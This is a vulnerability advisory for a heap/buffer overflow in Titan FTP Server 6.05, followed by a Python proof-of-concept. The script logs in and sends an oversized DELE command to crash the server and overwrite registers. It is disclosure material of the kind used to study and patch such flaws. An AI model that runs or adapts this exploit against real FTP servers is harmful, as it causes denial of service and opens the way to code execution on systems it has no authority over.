source: https://www.securityfocus.com/bid/27611/info

Titan FTP Server is prone to a remote buffer-overflow vulnerability because the application fails to bounds-check user-supplied data before copying it into an insufficiently sized buffer.

An attacker may exploit this issue to execute arbitrary code with SYSTEM-level privileges. Successfully exploiting this issue will result in the complete compromise of affected computers. Failed exploit attempts will result in a denial of service.

This issue affects Titan FTP Server 6.05 build 550; other versions may also be vulnerable. 

#!/usr/bin/python
#
# First of all, thanks to my wife Edita.
#
# Heap overflow in Titan FTP Server version 6.05 build 550
# (DELE ) - probably other commands are vulnerable too
# PoC tested on WinXP sp1
# EAX and ESI are overwritten with 41414141 and 44444444
#
# Greetz to muts, m1k1, bolexxx
# and crew from offsec, remote-exploit.org, Cedes.ba, Itas and Cikom :)
#
# Coded by Muris Kurgas a.k.a j0rgan < muris [at] cg [dot] yu >


import socket
s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)

print "\nSaljem zli bafer..."
buffer = '\x90' * 20519 + "A" * 4  + "D" * 4 + "B" * 55000
s.connect(('192.168.1.9',21))
data = s.recv(1024)
s.send('USER ftp' +'\r\n')
data = s.recv(1024)
s.send('PASS ftp' +'\r\n')
data = s.recv(1024)
print "\nBum! Bum! Bum! :)"
s.send('DELE ' +buffer+'\r\n')
s.close()


be safe,
j0rgan